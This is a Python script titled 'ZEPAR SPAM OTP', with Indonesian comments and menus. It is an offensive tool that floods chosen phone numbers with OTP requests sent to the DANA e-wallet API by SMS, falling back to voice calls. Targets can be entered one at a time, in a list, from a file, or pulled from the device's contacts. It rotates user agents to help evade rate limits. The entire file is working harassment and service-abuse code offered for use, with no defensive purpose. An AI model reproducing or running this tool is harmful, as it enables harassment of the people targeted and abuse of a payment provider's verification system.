#!/usr/bin/python
import requests,random,json,time,sys,os,re

# -----------------------------------------------------------
# Nama Tool: ZEPAR SPAM OTP
# Creator: Zepar
# Feature: DANA OTP Spam Only
# ---------------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------

class ZeparSpam:
    def __init__(self, nomer):
        self.nomer = nomer
        
    def dana_spam(self):
        # Membersihkan nomor (hapus +62 atau 0 di awal)
        nomor_bersih = self.nomer
        if nomor_bersih.startswith('+62'):
            nomor_bersih = nomor_bersih[3:]
        elif nomor_bersih.startswith('0'):
            nomor_bersih = nomor_bersih[1:]
        
        headers = {
            'User-Agent': random.choice(open('ua.txt').readlines()).split('\n')[0],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Host': 'api.dana.id',
            'Origin': 'https://www.dana.id',
            'Referer': 'https://www.dana.id/',
            'x-platform': 'android'
        }
        
        # Endpoint 1: Kirim OTP via SMS
        data_sms = {
            "mobileNo": nomor_bersih,
            "mobileCountryCode": "62",
            "type": "SMS"
        }
        
        try:
            req_sms = requests.post('https://api.dana.id/v1.0/otp/request', 
                                    headers=headers, 
                                    data=json.dumps(data_sms),
                                    timeout=10)
            
            if 'success' in req_sms.text or 'otpRequestId' in req_sms.text:
                return f'\x1b[92m[SUCCESS] Zepar DANA Spam -> {self.nomer} {h}OTP Terkirim (SMS)'
            elif 'limit' in req_sms.text.lower():
                return f'\x1b[91m[FAIL] Zepar DANA Spam -> {self.nomer} \x1b[91mLimit Terpenuhi'
            else:
                # Endpoint 2: Kirim OTP via Voice Call (backup)
                data_voice = {
                    "mobileNo": nomor_bersih,
                    "mobileCountryCode": "62",
                    "type": "VOICE"
                }
                req_voice = requests.post('https://api.dana.id/v1.0/otp/request',
                                          headers=headers,
                                          data=json.dumps(data_voice),
                                          timeout=10)
                
                if 'success' in req_voice.text or 'otpRequestId' in req_voice.text:
                    return f'\x1b[92m[SUCCESS] Zepar DANA Spam -> {self.nomer} {h}OTP Terkirim (Voice)'
                else:
                    return f'\x1b[91m[FAIL] Zepar DANA Spam -> {self.nomer} {m}Gagal'
                    
        except Exception as e:
            return f'\x1b[91m[FAIL] Zepar DANA Spam -> {self.nomer} {m}Error: {str(e)[:30]}'

# ---------------------------Fungsi Utama---------------------------
def apakah():
    while True:
        lan = str(input(k + '\tIngin lanjut? y/n : ' + h))
        if lan.lower() == 'y':
            menu_utama()
        elif lan.lower() == 'n':
            print(p + '\n\tTerima kasih telah menggunakan Zepar DANA Spam OTP')
            break
        else:
            continue

def single():
    nomer = str(input(k + '\tNomor target (contoh: 81234567890) : ' + h))
    jm = int(input(k + '\tJumlah spam : ' + h))
    dly = int(input(k + '\tJeda (detik) : ' + h))
    print('\n')
    for oo in range(jm):
        z = ZeparSpam(nomer)
        print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def multi():
    daftar_nomer = []
    jum = int(input(k + '\tJumlah nomor : ' + h))
    for i in range(jum):
        daftar_nomer.append(str(input(k + f'\tNomor ke-{i+1} : ' + h)))
    spm = int(input(k + '\tJumlah spam per nomor : ' + h))
    dly = int(input(k + '\tJeda (detik) : ' + h))
    print('\n')
    for i in range(spm):
        for nomor in daftar_nomer:
            z = ZeparSpam(nomor)
            print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def dari_file():
    fil = str(input(k + '\tNama file : ' + h))
    if fil in os.listdir(os.getcwd()):
        nomor_list = open(fil, 'r').readlines()
        js = int(input(k + '\tJumlah spam per nomor : ' + h))
        dly = int(input(k + '\tJeda (detik) : ' + h))
        print('\n')
        for _ in range(js):
            for line in nomor_list:
                nomor = line.split('\n')[0]
                if nomor:
                    z = ZeparSpam(nomor)
                    print('\t' + z.dana_spam())
            time.sleep(dly)
        apakah()
    else:
        print(m + f'\tFile {fil} tidak ditemukan')

def dari_kontak():
    os.system('termux-contact-list > .zepar_contact')
    kontak = json.loads(open('.zepar_contact', 'r').read())
    for idx, org in enumerate(kontak):
        print(m + str(idx+1) + ' ' + k + org['name'])
    pilih = int(input(u + '\tPilih nomor > ' + h)) - 1
    target = kontak[pilih]['number']
    # Bersihkan nomor dari karakter aneh
    target = re.sub(r'[^0-9+]', '', target)
    dly = int(input(u + '\tJeda (detik) > ' + h))
    jumlah = int(input(u + '\tJumlah spam : ' + h))
    print('\n')
    for _ in range(jumlah):
        z = ZeparSpam(target)
        print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def banner():
    os.system('clear')
    zepar_art = '''
\x1b[94m
╔═══════════════════════════════════════╗
║                                       ║
║   ███████╗███████╗██████╗  █████╗ ██████╗
║   ╚══███╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗
║     ███╔╝ █████╗  ██████╔╝███████║██████╔╝
║    ███╔╝  ██╔══╝  ██╔═══╝ ██╔══██║██╔══██╗
║    ███████╗███████╗██║     ██║  ██║██║  ██║
║    ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
║                                       ║
║         SPAM OTP - DANA               ║
║            Creator: Zepar             ║
╚═══════════════════════════════════════╝
\x1b[0m'''
    print(zepar_art)

def menu_utama():
    banner()
    print(b + '╔════════════════════════════════╗')
    print(b + '║' + h + '          ZEPAR DANA SPAM         ' + b + '║')
    print(b + '╠════════════════════════════════╣')
    print(b + '║' + m + '  [1] ' + bm + 'Single Target            ' + b + '║')
    print(b + '║' + m + '  [2] ' + bm + 'Multi Target             ' + b + '║')
    print(b + '║' + m + '  [3] ' + bm + 'Dari File                ' + b + '║')
    print(b + '║' + m + '  [4] ' + bm + 'Dari Kontak (Termux)     ' + b + '║')
    print(b + '║' + m + '  [0] ' + bm + 'Keluar                   ' + b + '║')
    print(b + '╚════════════════════════════════╝')
    
    pilih = str(input(b + '╚═► ' + u + 'Pilih' + m + ' : ' + h))
    
    if pilih == '1':
        single()
    elif pilih == '2':
        multi()
    elif pilih == '3':
        dari_file()
    elif pilih == '4':
        dari_kontak()
    elif pilih == '0':
        sys.exit()
    else:
        print(m + '             Pilihan salah')
        time.sleep(1)
        menu_utama()

if __name__ == '__main__':
    menu_utama()